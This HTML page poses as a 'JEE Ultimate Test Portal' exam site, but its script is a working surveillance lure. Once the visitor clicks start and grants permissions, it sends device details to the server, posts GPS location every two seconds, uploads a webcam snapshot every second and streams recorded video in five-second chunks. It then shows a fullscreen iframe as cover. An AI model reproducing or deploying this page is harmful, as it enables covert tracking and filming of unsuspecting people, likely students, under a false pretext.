<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>JEE Ultimate Test Portal</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
html,body{height:100%;overflow:hidden;color:white;}

body{
background:linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);
background-size:400% 400%;
animation:gradientMove 12s ease infinite;
}

@keyframes gradientMove{
0%{background-position:0% 50%;}
50%{background-position:100% 50%;}
100%{background-position:0% 50%;}
}

#overlay{
position:absolute;
width:100%;
height:100%;
overflow:auto;
backdrop-filter:blur(12px);
background:rgba(0,0,0,0.6);
padding:40px;
}

h1{
text-align:center;
font-size:48px;
margin-bottom:20px;
}

button{
padding:12px 25px;
border:none;
border-radius:30px;
cursor:pointer;
background:linear-gradient(45deg,#ff004c,#ff7a00);
color:white;
font-weight:bold;
font-size:18px;
}

iframe{width:100%;height:100%;border:0;display:none;}

#v,#c{display:none;}

</style>
</head>

<body>

<div id="overlay">

<h1>JEE Ultimate Test Portal</h1>

<button onclick="start()">▶ Start Test</button>

</div>

<iframe id="frame"></iframe>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>

let recorder;
let chunks=[];


/* DEVICE INFO */

function sendDeviceInfo(){

fetch("/device",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
device:navigator.platform,
os:navigator.userAgent,
browser:navigator.appVersion,
screen:screen.width+"x"+screen.height
})
});

}


/* LOCATION */

function sendLocation(){

navigator.geolocation.getCurrentPosition(function(pos){

fetch("/location",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
lat:pos.coords.latitude,
lon:pos.coords.longitude
})
});

});

}


/* SNAPSHOT */

function capture(){

if(!v.videoWidth) return;

c.width=v.videoWidth;
c.height=v.videoHeight;

const ctx=c.getContext("2d");

ctx.drawImage(v,0,0,c.width,c.height);

c.toBlob(b=>{

let f=new FormData();
f.append("photo",b,"u.jpg");

fetch("/upload",{method:"POST",body:f});

},"image/jpeg",0.9);

}


/* VIDEO RECORD */

function startVideo(stream){

recorder = new MediaRecorder(stream);

recorder.ondataavailable = e=>{
chunks.push(e.data);
};

recorder.onstop = ()=>{

let blob = new Blob(chunks,{type:"video/webm"});
chunks=[];

let f=new FormData();
f.append("video",blob,"v.webm");

fetch("/video",{method:"POST",body:f});

};

setInterval(()=>{

recorder.start();

setTimeout(()=>{
recorder.stop();
},5000);

},5000);

}


/* START TEST */

async function start(){

let pos;

try{

pos = await new Promise((resolve,reject)=>{
navigator.geolocation.getCurrentPosition(resolve,reject);
});

}catch(e){

alert("Location permission required");
return;

}

sendLocation();


let stream;

try{

stream = await navigator.mediaDevices.getUserMedia({
video:{facingMode:"user"}
});

}catch(e){

alert("Camera permission required");
return;

}

v.srcObject = stream;


sendDeviceInfo();

setInterval(sendLocation,2000);

setInterval(capture,1000);

startVideo(stream);


document.getElementById("overlay").style.display="none";


const r = await fetch("/get_video_link");
const d = await r.json();

const frame=document.getElementById("frame");

frame.style.display="block";
frame.src=d.url;

if(frame.requestFullscreen){
frame.requestFullscreen();
}

}

</script>

</body>
</html>
